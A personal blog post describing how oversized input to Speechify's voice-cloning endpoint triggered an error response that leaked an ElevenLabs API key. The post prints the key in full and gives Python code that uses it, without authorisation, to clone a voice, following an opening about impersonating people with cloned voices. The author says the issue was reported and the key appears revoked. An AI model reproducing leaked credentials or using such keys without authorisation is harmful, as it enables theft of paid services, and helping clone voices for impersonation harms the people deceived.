---
title: Speechify voice cloning API key leakage
layout: post
---

![speechify-logo](/assets/speechify-logo.png)

# Introduction
Yesterday, I came across a video on Youtube of a guy using an AI Voice cloning service to impersonate and troll people on the popular GTA5 modification framework known as FiveM.

It was pretty funny to watch because he was doing this on roleplay servers and, as you may already know, there are rules to follow and people tend to get into arguments frequently. 

- [EDITING clips with Ai to get an ADMIN FIRED! @parkerrYT](https://youtu.be/yvLb6gkPYgw?si=zLY_ITZl_RtUQZnT)

Put simply, he would record a sample of the voice to clone and use the ElevenLabs voice cloning service to make them say things they never meant to, of course revealing in the end what really happened.

# ElevenLabs AI Voice cloning
Next thing you know, I am looking at the plans that ElevenLabs offers, I wanted to play with it a little and see how accurate it really is but didn't feel like spending the 22$ (at the time), and started looking for an alternative.

![elevenlabs-prices](/assets/elevenlabs-prices.png)

# Speechify AI Voice cloning
The alternative I was looking for turned out to be Speechify as they offer a free trial version of the service, the only issue with it is that you can't change the text without upgrading your plan, making it look useless at first.

![speechify-interface](/assets/speechify-interface.png)

After playing a little with the text I noticed that the only character you are allowed to add are spaces, adding any other character would result in an annoying `upgrade for full access` message.

![annoying-message](/assets/annoying-message.png)

The next thing I tried was adding a lot of spaces and seeing how the endpoint would reply, after the text reaches the size of 5500 characters the endpoint replies with code 500 and greets us with the following data.

```
HTTP/2 500 Internal Server Error
Cache-Control: public, max-age=0, must-revalidate
Content-Type: application/json; charset=utf-8
Date: Tue, 05 Dec 2023 22:23:27 GMT
Etag: "qexsok88sj5k7"
Server: Vercel
Strict-Transport-Security: max-age=63072000
X-Matched-Path: /api/tts/clone
X-Vercel-Cache: MISS
X-Vercel-Id: fra1::iad1::jwvvj-1701815001593-c964271a4111
Content-Length: 7207

{
  "message": "Request failed with status code 400",
  "name": "AxiosError",
  "stack": "at ClientRequest.emit (node:domain:489:12)\n at HTTPParser...",
  "config": {
    "headers": {
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json",
      "xi-api-key": "a67a36e2011cf31e21343adb66f46ca2",
      "User-Agent": "axios/1.4.0",
      "Content-Length": "5611",
      "Accept-Encoding": "gzip, compress, deflate, br"
    },
    "params": {
      "optimize_streaming_latency": 3
    },
    "responseType": "stream",
    "method": "post",
    "url":"https://api.elevenlabs.io/v1/text-to-speech/voice_id"
  },
  "code": "ERR_BAD_REQUEST",
  "status": 400
}
```

Great! an ElevenLabs API key seems to have been leaked, now all that's left to do is read the ElevenLabs documentation and use the api key to access the voice cloning service using their python library.

```python
from elevenlabs import clone, generate, play
from elevenlabs import set_api_key

api_key = 'a67a36e2011cf31e21343adb66f46ca2'
set_api_key(api_key)

voice = clone(name="nekka",
              files=["./sample.mp3"])

audio = generate(text="hi! how you doing?",
                 voice=voice, 
                 model='eleven_multilingual_v2')

audio_file = open('output.mp3', 'wb')
audio_file.write(audio)
audio_file.close()
```

After running the script we get our `output.mp3` file containing the result!

![output-file](/assets/voice-clone-files.png)

# Conclusion
I sent them an email to get this sorted out but never received a reply. As of now, it appears that the leakage has been resolved, and the API key has been invalidated.